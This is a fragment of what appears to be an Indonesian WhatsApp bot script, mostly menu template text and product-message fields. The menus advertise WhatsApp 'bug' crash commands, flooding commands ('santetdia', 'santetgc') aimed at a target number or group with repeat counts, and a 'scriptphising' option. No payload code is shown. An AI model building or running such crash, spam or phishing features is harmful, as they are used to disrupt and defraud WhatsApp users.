"text": `
Welcome ${pushname} 👋 Selamat ${salam}
◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*
...
*[ 🤖 ] LIST MENU*
┏━━⊱ 
┣❏➥ hostingmenu [ Hosting Menu ]
┣❏➥ botmenu [ My Botz ]
┣❏➥ cmdmenu [ Cmd Menu ]
┣❏➥ bugmenu [ Bug Menu ]
┣❏➥ ownermenu [ Owner Menu ]
┣❏➥ soundmenu [ Sound Botz ]
┣❏➥ groupmenu [ Grub Menu ]
┣❏➥ convertmenu [ Convert Menu ]
┣❏➥ downloadmenu [ Download Menu ]
┣❏➥ scriptbotz [ Source Code Botz ]
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭
*NOTE*
Script : Chat Owner
...
*[ 🤖 ] HOSTING MENU* 
┏━━⊱
┣❏➥ subdomain [ Name|Internet Protocol ]
┣❏➥ addpackage [ Username|Package ]
┣❏➥ termint [ Delete Account ]
┣❏➥ scriptphising [ Script Phising ]
┣❏➥ listsubdomain [ List Subdomain ]
...
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` Welcome ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu`,
"description": ` - Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬 -
...
┣❏➥ jadibug4 [ Reply Stickers To Bug Image ]
┣❏➥ jadibug5 [ Reply Image Jadi Bug Once ] 
┣ 「 GOOD BUG 」
┣❏➥ bugstik [ Example : Bugstik 5 ]
┣❏➥ bugie [ Example : Bugie 5 ]
┣❏➥ buglokas [ Bug Location ]
┣❏➥ bugtod [ Bug Contact ]
┣❏➥ bugbokep [ Bug Video ]
┣❏➥ buginvite [ Bug Private Chat ]
┣❏➥ bugbctext [ Bug Text Broadcast ]
┣ 「 TOOLS 」
┣❏➥ > m.chat To Get ID
┣ 「 SEND TO 」
┣❏➥ santetdia [ Example : santetdia 62XXX@s.whatsapp.net|10|10s ]
┣❏➥ santetgc [ Example : santetgc 1234XXX@g.us|10|10s ]
┣❏➥ catalogpc [ Example : catalogpc 62XXX@s.whatsapp.net|10|10s ]
┣❏➥ cataloggc [ Example : cataloggc 1234XXX@g.us|10|10s ]
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭
[ 𝐆𝐑𝐔𝐁 𝐌𝐄𝐍𝐔 ]
┏━━⊱ 
...
[ 𝐂𝐌𝐃 𝐌𝐄𝐍𝐔 ]
┏━━⊱ 
┣❏➥ setcmd [ Set Command Prompt ]
┣❏➥ listcmd [ List Command Prompt ]
┣❏➥ delcmd [ Delete Command Prompt ]
┣❏➥ lockcmd [ Lock Command Prompt ]
┣❏➥ addmsg [ Add Message ]
...
┣❏➥ block @user
┣❏➥ unblock @user
┣❏➥ bcgroup [ Broadcast Grub ]
┣❏➥ bcimage [ Broadcast Image ]
┣❏➥ bctext [ Broadcast Text ]
┣❏➥ bcvideo [ Broadcast Video ]
┣❏➥ bcaudio [ Broadcast Audio ]
┣❏➥ bcall  [ Broadcast ]
┣❏➥ setppbot [ Image ]
┣❏➥ setexif [ DarkGo ]
┣❏➥ setmenu [ Option ]
...
"salePriceAmount1000": "10000000",
"retailerId": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,
"url": "wa.me/6285659610756"
},
"businessOwnerJid": "6285659610756@s.whatsapp.net",
}
